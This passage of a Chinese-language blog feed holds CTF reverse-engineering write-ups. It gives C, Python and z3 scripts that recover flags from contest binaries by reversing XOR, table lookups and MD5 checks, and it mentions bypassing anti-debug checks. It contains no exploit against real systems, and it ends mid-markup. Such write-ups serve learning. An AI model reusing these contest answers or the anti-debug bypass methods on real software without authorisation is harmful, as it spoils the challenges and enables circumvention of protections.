</span><br><span class="line">          103, 43, 254, 215, 171, 118 &#125;, &#123; </span><br><span class="line">          202, 130, 201, 125, 250, 89, 71, 240, 173, 212, </span><br><span class="line">          162, 175, 156, 164, 114, 192 &#125;, &#123; </span><br><span class="line">          183, 253, 147, 38, 54, 63, 247, 204, 52, 165, </span><br><span class="line">          229, 241, 113, 216, 49, 21 &#125;, &#123; </span><br><span class="line">          4, 199, 35, 195, 24, 150, 5, 154, 7, 18, </span><br><span class="line">          128, 226, 235, 39, 178, 117 &#125;, &#123; </span><br><span class="line">          9, 131, 44, 26, 27, 110, 90, 160, 82, 59, </span><br><span class="line">          214, 179, 41, 227, 47, 132 &#125;, &#123; </span><br><span class="line">          83, 209, 237, 32, 252, 177, 91, 106, 203, 190, </span><br><span class="line">          57, 74, 76, 88, 207 &#125;, &#123; </span><br><span class="line">          208, 239, 170, 251, 67, 77, 51, 133, 69, 249, </span><br><span class="line">          2, 127, 80, 60, 159, 168 &#125;, &#123; </span><br><span class="line">          81, 163, 64, 143, 146, 157, 56, 245, 188, 182, </span><br><span class="line">          218, 33, 16, 255, 243, 210 &#125;, &#123; </span><br><span class="line">          205, 12, 19, 236, 95, 151, 68, 23, 196, 167, </span><br><span class="line">          126, 61, 100, 93, 25, 115 &#125;, &#123; </span><br><span class="line">          96, 129, 79, 220, 34, 42, 144, 136, 70, 238, </span><br><span class="line">          184, 20, 222, 94, 11, 219 &#125;, </span><br><span class="line">        &#123; </span><br><span class="line">          224, 50, 58, 10, 73, 6, 36, 92, 194, 211, </span><br><span class="line">          172, 98, 145, 149, 228, 121 &#125;, &#123; </span><br><span class="line">          231, 200, 55, 109, 141, 213, 78, 169, 108, 86, </span><br><span class="line">          244, 234, 101, 122, 174, 8 &#125;, &#123; </span><br><span class="line">          186, 120, 37, 46, 28, 166, 180, 198, 232, 221, </span><br><span class="line">          116, 31, 75, 189, 139, 138 &#125;, &#123; </span><br><span class="line">          112, 62, 181, 102, 72, 3, 246, 14, 97, 53, </span><br><span class="line">          87, 185, 134, 193, 29, 158 &#125;, &#123; </span><br><span class="line">          225, 248, 152, 17, 105, 217, 142, 148, 155, 30, </span><br><span class="line">          135, 233, 206, 85, 40, 223 &#125;, &#123; </span><br><span class="line">          140, 161, 137, 13, 191, 230, 66, 104, 65, 153, </span><br><span class="line">          45, 15, 176, 84, 187, 22 &#125; &#125;;</span><br><span class="line">int a[]&#x3D;&#123;0,2,0,6,8,11,11,8,7,8,13,4,6,11,8,12,2,6,0,11,15&#125;;</span><br><span class="line">int b[]&#x3D;&#123;10,14,2,8,4,3,12,4,2,4,3,8,8,12,4,10,14,4,5,12,13&#125;;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;0;i&lt;22;i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,s[a[i]][b[i]]);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">&#x2F;&#x2F;g1wE_me_@_fREe_t1CkeT</span><br></pre></td></tr></table></figure><h2 id="RELF"><a href="#RELF" class="headerlink" title="RELF"></a>RELF</h2><p>elf文件</p><p>ida分析<br><img src="https://i.loli.net/2021/05/24/LktJcoAy6fjIrpg.png"><br>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int v3[30];</span><br><span class="line">int v5[30];</span><br><span class="line">int v4[30];</span><br><span class="line">int flag[30];</span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">v5[0] &#x3D; 34;</span><br><span class="line">  v5[1] &#x3D; 29;</span><br><span class="line">  v5[2] &#x3D; 76;</span><br><span class="line">  v5[3] &#x3D; 98;</span><br><span class="line">  v5[4] &#x3D; 43;</span><br><span class="line">  v5[5] &#x3D; 52;</span><br><span class="line">  v5[6] &#x3D; 97;</span><br><span class="line">  v5[7] &#x3D; 24;</span><br><span class="line">  v5[8] &#x3D; 40;</span><br><span class="line">  v5[9] &#x3D; 23;</span><br><span class="line">  v5[10] &#x3D; 4;</span><br><span class="line">  v5[11] &#x3D; 69;</span><br><span class="line">  v5[12] &#x3D; 44;</span><br><span class="line">  v5[13] &#x3D; 52;</span><br><span class="line">  v5[14] &#x3D; 43;</span><br><span class="line">  v5[15] &#x3D; 80;</span><br><span class="line">  v5[16] &#x3D; 1;</span><br><span class="line">  v5[17] &#x3D; 63;</span><br><span class="line">  v5[18] &#x3D; 79;</span><br><span class="line">  v5[19] &#x3D; 48;</span><br><span class="line">  v5[20] &#x3D; 55;</span><br><span class="line">  v5[21] &#x3D; 8;</span><br><span class="line">  v5[22] &#x3D; 26;</span><br><span class="line">  v5[23] &#x3D; 95;</span><br><span class="line">  v5[24] &#x3D; 4;</span><br><span class="line">  v5[25] &#x3D; 34;</span><br><span class="line">  v5[26] &#x3D; 82;</span><br><span class="line">  v5[27] &#x3D; 11;</span><br><span class="line">  v5[28] &#x3D; 51;</span><br><span class="line">  v5[29] &#x3D; 81;</span><br><span class="line">  v4[0] &#x3D; 297;</span><br><span class="line">  v4[1] &#x3D; 169;</span><br><span class="line">  v4[2] &#x3D; 431;</span><br><span class="line">  v4[3] &#x3D; 229;</span><br><span class="line">  v4[4] &#x3D; 423;</span><br><span class="line">  v4[5] &#x3D; 257;</span><br><span class="line">  v4[6] &#x3D; 465;</span><br><span class="line">  v4[7] &#x3D; 288;</span><br><span class="line">  v4[8] &#x3D; 437;</span><br><span class="line">  v4[9] &#x3D; 86;</span><br><span class="line">  v4[10] &#x3D; 364;</span><br><span class="line">  v4[11] &#x3D; 123;</span><br><span class="line">  v4[12] &#x3D; 390;</span><br><span class="line">  v4[13] &#x3D; 485;</span><br><span class="line">  v4[14] &#x3D; 232;</span><br><span class="line">  v4[15] &#x3D; 352;</span><br><span class="line">  v4[16] &#x3D; 244;</span><br><span class="line">  v4[17] &#x3D; 469;</span><br><span class="line">  v4[18] &#x3D; 54;</span><br><span class="line">  v4[19] &#x3D; 359;</span><br><span class="line">  v4[20] &#x3D; 16;</span><br><span class="line">  v4[21] &#x3D; 110;</span><br><span class="line">  v4[22] &#x3D; 355;</span><br><span class="line">  v4[23] &#x3D; 244;</span><br><span class="line">  v4[24] &#x3D; 256;</span><br><span class="line">  v4[25] &#x3D; 94;</span><br><span class="line">  v4[26] &#x3D; 187;</span><br><span class="line">  v4[27] &#x3D; 19;</span><br><span class="line">  v4[28] &#x3D; 242;</span><br><span class="line">  v4[29] &#x3D; 432;</span><br><span class="line">  v3[0] &#x3D; 3765;</span><br><span class="line">  v3[1] &#x3D; 3301;</span><br><span class="line">  v3[2] &#x3D; 7803;</span><br><span class="line">  v3[3] &#x3D; 10323;</span><br><span class="line">  v3[4] &#x3D; 5712;</span><br><span class="line">  v3[5] &#x3D; 3845;</span><br><span class="line">  v3[6] &#x3D; 5218;</span><br><span class="line">  v3[7] &#x3D; 1968;</span><br><span class="line">  v3[8] &#x3D; 4237;</span><br><span class="line">  v3[9] &#x3D; 1696;</span><br><span class="line">  v3[10] &#x3D; 704;</span><br><span class="line">  v3[11] &#x3D; 7713;</span><br><span class="line">  v3[12] &#x3D; 4746;</span><br><span class="line">  v3[13] &#x3D; 6517;</span><br><span class="line">  v3[14] &#x3D; 2339;</span><br><span class="line">  v3[15] &#x3D; 4192;</span><br><span class="line">  v3[16] &#x3D; 354;</span><br><span class="line">  v3[17] &#x3D; 6454;</span><br><span class="line">  v3[18] &#x3D; 6137;</span><br><span class="line">  v3[19] &#x3D; 5015;</span><br><span class="line">  v3[20] &#x3D; 6396;</span><br><span class="line">  v3[21] &#x3D; 942;</span><br><span class="line">  v3[22] &#x3D; 2825;</span><br><span class="line">  v3[23] &#x3D; 8129;</span><br><span class="line">  v3[24] &#x3D; 448;</span><br><span class="line">  v3[25] &#x3D; 1760;</span><br><span class="line">  v3[26] &#x3D; 9863;</span><br><span class="line">  v3[27] &#x3D; 778;</span><br><span class="line">  v3[28] &#x3D; 6617;</span><br><span class="line">  v3[29] &#x3D; 432;</span><br><span class="line">for(i&#x3D;0;i&lt;30;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;(v3[i]-v4[i])&#x2F;v5[i];</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">&#x2F;&#x2F;flag&#123;E1F_FUnct10n_Math_S01vE&#125;</span><br></pre></td></tr></table></figure><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><p>一个TLSCallback函数，检查ida.exe，和od是否运行的反调试<br><img src="https://i.loli.net/2021/05/24/lpGtNDdBz3I1hFL.png"><br>两个做法，直接乱设置ip，或者静态解，反正就是一些异或</p><p>我这里是动调得到flag<br><code>flag&#123;congratula tions_for_you&#125;</code></p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>exe文件，随机产生一个数，然后输入一个数满足一些条件就会输出flag。<br><img src="https://i.loli.net/2021/05/25/e6DWamvpjH5LhN4.png"><br>直接动调绕过</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>简单的算法，就是取表中的数据组成flag</p><p>爆破脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; &#x2F;&#x2F; edx</span><br><span class="line">  int len; &#x2F;&#x2F; esi</span><br><span class="line">  int v3; &#x2F;&#x2F; edi</span><br><span class="line">  char v4; &#x2F;&#x2F; al</span><br><span class="line">  int v5; &#x2F;&#x2F; eax</span><br><span class="line">  char v6; &#x2F;&#x2F; al</span><br><span class="line">  char v8[68]&#x3D;&quot;0123456789+&#x2F;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;; &#x2F;&#x2F; [esp+Ch] [ebp-130h] BYREF</span><br><span class="line">  char v9[68]&#x3D;&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+&#x2F;&quot;; &#x2F;&#x2F; [esp+50h] [ebp-ECh] BYREF</span><br><span class="line">  char v10[68]&#x3D;&quot;+&#x2F;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; &#x2F;&#x2F; [esp+94h] [ebp-A8h] BYREF</span><br><span class="line">  char v11[68]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;; &#x2F;&#x2F; [esp+D8h] [ebp-64h] BYREF</span><br><span class="line">  char v12[28]&#x3D;&quot;QASWZXDECVFRBNGTHYJUMKIOLP&quot;;</span><br><span class="line"> &#x2F;&#x2F; flag&#123;ZN0Y_is_a_easy_YuanLa&#125;</span><br><span class="line">  int code[]&#x3D;&#123;116,102,111,81,53,99,107,107,119,104,88,53,49,72,89,112,120,65,106,107,77,81,89,84,65,112,53&#125;;</span><br><span class="line">int i,j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for(i&#x3D;0;i&lt;27;i++)</span><br><span class="line">&#123;</span><br><span class="line">for(j&#x3D;95;j&lt;127;j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">v5&#x3D;j-v12[i%26];</span><br><span class="line">switch ( v5 &amp; 0x80000003)</span><br><span class="line">        &#123;</span><br><span class="line">          case 0u:</span><br><span class="line">            v6 &#x3D; v11[v5];</span><br><span class="line">            break;</span><br><span class="line">          case 1u:</span><br><span class="line">            v6 &#x3D; v10[v5];</span><br><span class="line">            break;</span><br><span class="line">          case 2u:</span><br><span class="line">            v6 &#x3D; v9[v5];</span><br><span class="line">            break;</span><br><span class="line">          case 3u:</span><br><span class="line">            v6 &#x3D; v8[v5];</span><br><span class="line">            break;</span><br><span class="line">&#125;</span><br><span class="line">if((v6&#x3D;&#x3D;code[i]))</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,j);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;flag&#123;this_is_a_easy_suanfa&#125;</span><br></pre></td></tr></table></figure><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get_flag"></a>get_flag</h2><p>去花，去掉几个E8 ,然后逻辑比较简单<br><img src="https://i.loli.net/2021/05/25/ey4v52loLuxk6iV.png"><br>z3来解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from z3 import *</span><br><span class="line">code&#x3D;[0xB9, 0x3A, 0xA9, 0xD8, 0x15, 0x8A, 0xE7, 0x42, 0x69, 0x90, 0xCA, 0xA3, 0x4D, 0xD8, 0xD9, 0xC9]</span><br><span class="line"></span><br><span class="line">s &#x3D; Solver()</span><br><span class="line">flag &#x3D; [BitVec((&#39;x%d&#39; % i), 8) for i in range(16)]</span><br><span class="line">for i in range(16):</span><br><span class="line">    mid&#x3D;flag[i]</span><br><span class="line">    mid&#x3D;mid^(mid*2-6)</span><br><span class="line">    mid&#x3D;mid-i*2</span><br><span class="line">    s.add(mid&#x3D;&#x3D;code[i])</span><br><span class="line"></span><br><span class="line">if s.check() &#x3D;&#x3D; sat:</span><br><span class="line">     model &#x3D; s.model()</span><br><span class="line">     str &#x3D; [chr(model[flag[i]].as_long().real) for i in range(16)]</span><br><span class="line">     print(&quot;&quot;.join(str))</span><br><span class="line">     exit()</span><br><span class="line">else:</span><br><span class="line">     print(&quot;no_sat&quot;)</span><br><span class="line">#mBqL!zS6-hLm)XY_</span><br></pre></td></tr></table></figure><h2 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h2><p>这道题比较有意思的是那个异或加密的伪代码和汇编层的样子。估计是因为64位程序，转换为那样的汇编比较快吧。</p><p>ida分析，加密1<br><img src="https://i.loli.net/2021/05/25/IlJnH3icFZqsoLY.png"><br>加密二，数组内异或加密<br><img src="https://i.loli.net/2021/05/25/St9CfHOn6Tkygro.png"></p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int flag[32]&#x3D;&#123;0x99,0xb0,0x87,0x9e,0x70,0xe8,0x41,0x44,0x05,0x04,0x8b,0x9a,0x74,0xbc,0x55,0x58,0xb5,0x61,0x8e,0x36,0xac,0x09,0x59,0xe5,0x61,0xdd,0x3e,0x3f,0xb9,0x15,0xed,0xd5&#125;;</span><br><span class="line">int i,j;</span><br><span class="line">&#x2F;&#x2F;unsigned __int64 v[]&#x3D;&#123;0x4441E8709E87B099,0x5855BC749A8B0405,0xE55909AC368E61B5,0xD5ED15B93F3EDD61&#125;;</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;for(j&#x3D;0;j&lt;4;j++)</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;for(i&#x3D;0;i&lt;8;i++)</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;printf(&quot;0x%02x,&quot;,v[j]&amp;0xff);</span><br><span class="line">&#x2F;&#x2F;v[j]&#x3D;v[j]&gt;&gt;8;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;0;i&lt;&#x3D;3;i++)</span><br><span class="line">&#123;</span><br><span class="line">for(j&#x3D;31;j&gt;0;j--)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;flag[j]&#x3D;flag[j]^flag[j-1];</span><br><span class="line">flag[j]&#x3D;flag[j]^flag[j-1];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">  &#123;</span><br><span class="line">&#x2F;&#x2F;   flag[i]&#x3D;(flag[i]&gt;&gt;6)|(flag[i]&lt;&lt;2)  ^ i</span><br><span class="line">flag[i]^&#x3D;i;</span><br><span class="line">flag[i]&#x3D;((flag[i]&amp;3)&lt;&lt;6)|((flag[i]&gt;&gt;2)&amp;0x3f);</span><br><span class="line">printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F;flag&#123;W0w_y0u_m4st3r_C_p1us_p1us&#125;</span><br></pre></td></tr></table></figure><h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>一个md5加密的算法，然后需要满足后面的一些条件，爆破就行了。</p><p>python</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for a in range(97,123):</span><br><span class="line">    for b in range(97,123):</span><br><span class="line">        for c in range(97,123):</span><br><span class="line">            for d in range(97,123):</span><br><span class="line">                for e in range(97,123):</span><br><span class="line">                    for f in range(97,123):</span><br><span class="line">                        str &#x3D; chr(a)+chr(b)+chr(c)+chr(d)+chr(e)+chr(f)</span><br><span class="line">                        flag &#x3D; hashlib.md5(str.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">                        v14 &#x3D; 0</span><br><span class="line">                        v13 &#x3D; 0</span><br><span class="line">                        for i in range(32):</span><br><span class="line">                            if(flag[i]&#x3D;&#x3D;&#39;0&#39;):</span><br><span class="line">                                v14+&#x3D;1</span><br><span class="line">                                v13+&#x3D;i</span><br><span class="line">                        if (10 * v14 + v13 &#x3D;&#x3D; 403):</span><br><span class="line">                            print(str)</span><br><span class="line">#ozulmt</span><br></pre></td></tr></table></figure><p>然后这个程序也不能运行了，后面的check函数也要通过decode函数解密出来，我解密出来，看不出什么逻辑。</p><h2 id="app"><a href="#app" class="headerlink" title="app"></a>app</h2><p>好像要调试，调试so文件一直有问题，后面来解决</p><h2 id="muma-apk"><a href="#muma-apk" class="headerlink" title="muma.apk"></a>muma.apk</h2><p>apk做的比较少，后面学习了在来看。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Neepu ctf wp</title>
      <link href="2021/05/25/Neepu%20ctf%20wp/"/>
      <url>2021/05/25/Neepu%20ctf%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Neepu-ctf-wp"><a href="#Neepu-ctf-wp" class="headerlink" title="Neepu ctf wp"></a>Neepu ctf wp</h1><p>拿了个第一，AK了re，哈哈哈还是可以。<br><img src="https://i.loli.net/2021/05/25/6wIcyOb2FosYkBj.png"><br><img src="https://i.loli.net/2021/05/25/zkpnecMBoWSTaVJ.png"><br>ID:The_Itach1</p><p>总排名: 1</p><p>分数： 8347</p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="OLLEH"><a href="#OLLEH" class="headerlink" title="OLLEH"></a>OLLEH</h3><p>有点可惜，本来可以一血的，被NEEPU给迷惑了，哈哈哈。</p><p>ida看，流程，动调比较快<br><img src="https://i.loli.net/2021/05/23/x2zurLfiqV3mh5v.png"><br>动调绕过得到<br><img src="https://i.loli.net/2021/05/23/3JG9WDaZyEBmOvh.png"><br>MD5加密一下，故flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Neepu&#123;a4db343d5faf70bc4fb88dd8d4dc86de&#125;</span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>开始分析是分析exe文件，然后看了里面的一些字符串，什么.net之类的，后来发现flag在dll里面。</p><p>用dSspy打开dll，找到加密逻辑，大概就是栅栏，和简单字符处理<br><img src="https://i.loli.net/2021/05/23/wC6hkNYLF3USsZo.png"></p><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">void Encrypt1(char *string1)</span><br><span class="line">&#123;</span><br><span class="line">int num &#x3D; 16;</span><br><span class="line">for (int i &#x3D; 0; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line">bool flag &#x3D; string1[i] &gt;&#x3D; &#39;a&#39; &amp;&amp; string1[i] &lt;&#x3D; &#39;z&#39;;</span><br><span class="line">if (flag)</span><br><span class="line">&#123;</span><br><span class="line">bool flag2 &#x3D; string1[i] &gt;&#x3D; &#39;a&#39; &amp;&amp; string1[i] &lt;&#x3D; &#39;y&#39;;</span><br><span class="line">if (flag2)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] -&#x3D; &#39;\u001f&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">string1[i] &#x3D; &#39;A&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">bool flag3 &#x3D; string1[i] &gt;&#x3D; &#39;A&#39; &amp;&amp; string1[i] &lt;&#x3D; &#39;Z&#39;;</span><br><span class="line">if (flag3)</span><br><span class="line">&#123;</span><br><span class="line">bool flag4 &#x3D; string1[i] &gt;&#x3D; &#39;A&#39; &amp;&amp; string1[i] &lt;&#x3D; &#39;Y&#39;;</span><br><span class="line">if (flag4)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] +&#x3D; &#39;!&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">string1[i] &#x3D; &#39;a&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">bool flag5 &#x3D; string1[i] &gt;&#x3D; &#39;0&#39; &amp;&amp; string1[i] &lt;&#x3D; &#39;9&#39;;</span><br><span class="line">if (flag5)</span><br><span class="line">&#123;</span><br><span class="line">bool flag6 &#x3D; string1[i] &#x3D;&#x3D; &#39;9&#39;;</span><br><span class="line">if (flag6)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] &#x3D; &#39;0&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">string1[i] +&#x3D; &#39;\u0001&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char text[] &#x3D; &quot;mDDOT&#123;gDO09_bSE&#125;&quot;;</span><br><span class="line">Encrypt1(text);</span><br><span class="line">printf(&quot;%s&quot;,text);</span><br><span class="line">&#125;</span><br><span 